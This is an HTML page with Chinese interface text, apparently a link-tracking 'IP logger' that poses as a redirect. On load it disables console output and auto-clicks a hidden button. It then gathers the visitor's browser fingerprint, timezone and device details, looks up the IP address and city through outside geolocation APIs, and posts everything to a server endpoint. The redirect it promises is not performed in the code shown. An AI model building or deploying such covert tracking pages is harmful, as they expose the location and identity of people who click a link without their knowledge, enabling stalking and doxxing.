<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>访问跟踪</title>
  <link rel="preconnect" href="https://ipapi.co">
  <style>
    /* 样式保持不变，与原有相同 */
    @layer utilities {
      .content-auto { content-visibility: auto; }
      .pulse-animation {
        animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
      }
      @keyframes pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.5; }
      }
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background-color: #f3f4f6;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      max-width: 400px;
      width: 100%;
      background: white;
      border-radius: 10px;
      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
      overflow: hidden;
    }
    .content { padding: 2rem; text-align: center; }
    .icon-wrapper {
      width: 64px;
      height: 64px;
      margin: 0 auto 1.5rem;
      border-radius: 50%;
      background-color: #3b82f61a;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .icon { color: #3b82f6; font-size: 24px; }
    .title {
      font-size: 1.25rem;
      font-weight: 600;
      color: #1f2937;
      margin-bottom: 0.5rem;
    }
    .message { color: #6b7280; font-size: 0.875rem; }
    .footer {
      padding: 1rem 2rem;
      background-color: #f9fafb;
      border-top: 1px solid #f3f4f6;
      text-align: center;
    }
    .footer-text { color: #9ca3af; font-size: 0.75rem; }
    /* 新增样式：隐藏发送按钮 */
    #sendBtn { display: none; }
  </style>
  <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
</head>
<body>
  <div class="container">
    <div class="content">
      <div class="icon-wrapper pulse-animation">
        <i class="fa fa-envelope-o icon"></i>
      </div>
      <h2 class="title">处理中</h2>
      <p class="message" id="status-message">正在记录访问信息...</p>
    </div>
    <div class="footer">
      <p class="footer-text">此页面用于访问跟踪，将自动跳转</p>
    </div>
  </div>
  <!-- 按钮仍然存在但会被CSS隐藏 -->
  <button id="sendBtn">发送IP信息到邮箱</button>

  <script>
    // 禁用所有控制台输出
    Object.keys(console).forEach(key => { console[key] = function() {}; });
    
    // 优化后的IP获取按钮事件（按钮已隐藏但功能保留）
    document.getElementById('sendBtn').addEventListener('click', async () => {
        const statusEl = document.getElementById('status-message');
        statusEl.textContent = '正在获取IP信息...';
        
        try {
            const ipApiUrl = `${window.location.origin}/api/proxy-ip`;
            
            // 添加超时控制的请求
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 8000);
            
            const ipResponse = await fetch(ipApiUrl, { signal: controller.signal });
            clearTimeout(timeoutId);
            
            const ipResponseText = await ipResponse.text();
            
            if (!ipResponse.ok) {
                throw new Error(`获取IP信息失败 [${ipResponse.status}]: ${ipResponseText}`);
            }
            
            let ipData;
            try {
                ipData = JSON.parse(ipResponseText);
            } catch (e) {
                throw new Error(`IP信息解析失败: ${e.message}, 原始内容: ${ipResponseText}`);
            }

            statusEl.textContent = 'IP信息获取成功，准备发送...';
            
        } catch (error) {
            statusEl.textContent = `IP获取失败: ${error.message.substring(0, 30)}...`;
        }
    });
    document.getElementById('sendBtn').click();

    // 1. 获取URL参数中的目标地址
    function getTargetUrl() {
      const urlParams = new URLSearchParams(window.location.search);
      let targetUrl = urlParams.get('url') || urlParams.get('u') || '';
      
      if (!targetUrl) return '未指定URL';
      
      // 补全协议（如果没有的话）
      if (!/^https?:\/\//i.test(targetUrl)) {
        targetUrl = 'https://' + targetUrl;
      }
      
      return targetUrl;
    }

    // 2. 获取浏览器和系统信息（增强版）
    function getBrowserInfo() {
      const ua = navigator.userAgent;
      let browser = '未知浏览器', version = '未知版本', os = '未知系统';

      // 浏览器检测
      if (/edg/i.test(ua)) { browser = 'Edge'; version = ua.match(/Edge\/(\d+)/)?.[1] }
      else if (/chrome/i.test(ua)) { browser = 'Chrome'; version = ua.match(/Chrome\/(\d+)/)?.[1] }
      else if (/firefox/i.test(ua)) { browser = 'Firefox'; version = ua.match(/Firefox\/(\d+)/)?.[1] }
      else if (/safari/i.test(ua)) { browser = 'Safari'; version = ua.match(/Version\/(\d+)/)?.[1] }
      
      // 操作系统检测
      if (/windows/i.test(ua)) os = 'Windows';
      else if (/macintosh/i.test(ua)) os = 'macOS';
      else if (/linux/i.test(ua)) os = 'Linux';
      else if (/iphone/i.test(ua)) os = 'iOS';
      else if (/ipad/i.test(ua)) os = 'iPadOS';
      else if (/android/i.test(ua)) os = 'Android';

      return {
        browser: `${browser} ${version || '未知版本'}`,
        os,
        userAgent: ua
      };
    }

    // 3. 获取增强的设备信息
    function getDeviceInfo() {
      return {
        screen: {
          width: screen.width,
          height: screen.height,
          pixelRatio: window.devicePixelRatio,
          colorDepth: screen.colorDepth
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        languages: navigator.languages,
        doNotTrack: navigator.doNotTrack === '1',
        cookieEnabled: navigator.cookieEnabled,
        online: navigator.onLine,
        cpuCores: navigator.hardwareConcurrency || '未知'
      };
    }

    // 4. 优化的IP和位置信息获取（带超时和错误处理）
    async function getLocationInfo() {
      const defaultResult = { 
        ip: '未知',
        country_name: '未知',
        region: '未知',
        city: '未知',
        error: ''
      };
      
      try {
        const fetchWithTimeout = async (url, timeout = 5000) => {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), timeout);
          
          try {
            const response = await fetch(url, { signal: controller.signal });
            if (!response.ok) throw new Error(`HTTP错误: ${response.status}`);
            return await response.json();
          } finally {
            clearTimeout(timeoutId);
          }
        };

        return await fetchWithTimeout('https://ipapi.co/json/');
      } catch (primaryError) {
        try {
          return await fetchWithTimeout('https://ipwho.is/');
        } catch (fallbackError) {
          return {
            ...defaultResult,
            error: `主API: ${primaryError.message}; 备用API: ${fallbackError.message}`
          };
        }
      }
    }

    // 5. 主函数：收集并发送数据
    async function trackAndRedirect() {
      const targetUrl = getTargetUrl();
      const statusEl = document.getElementById('status-message');
      
      try {
        statusEl.textContent = '收集浏览器信息...';
        const browserInfo = getBrowserInfo();
        const deviceInfo = getDeviceInfo();
        const visitTime = new Date().toLocaleString('zh-CN');
        const referrer = document.referrer || '无引用页';
        
        statusEl.textContent = '获取位置信息...';
        const locationInfo = await getLocationInfo();
        
        statusEl.textContent = '发送通知...';
        const trackingData = {
          targetUrl,
          visitTime,
          referrer,
          browser: browserInfo.browser,
          os: browserInfo.os,
          userAgent: `${browserInfo.userAgent}\nIP信息: ${JSON.stringify(locationInfo, null, 2)}`,
          ...deviceInfo,
          ip: locationInfo.ip,
          location: {
            country: locationInfo.country_name,
            region: locationInfo.region,
            city: locationInfo.city
          }
        };

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);
        
        const response = await fetch('/api/send-notification', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(trackingData),
          signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        
        if (response.ok) {
          statusEl.textContent = '处理完成，即将跳转...';
        } else {
          statusEl.textContent = '通知发送失败，即将跳转...';
        }
      } catch (error) {
        statusEl.textContent = '处理过程中发生错误';
      }
    }

    // 页面加载后执行
    document.addEventListener('DOMContentLoaded', trackAndRedirect);
  </script>
</body>
</html>
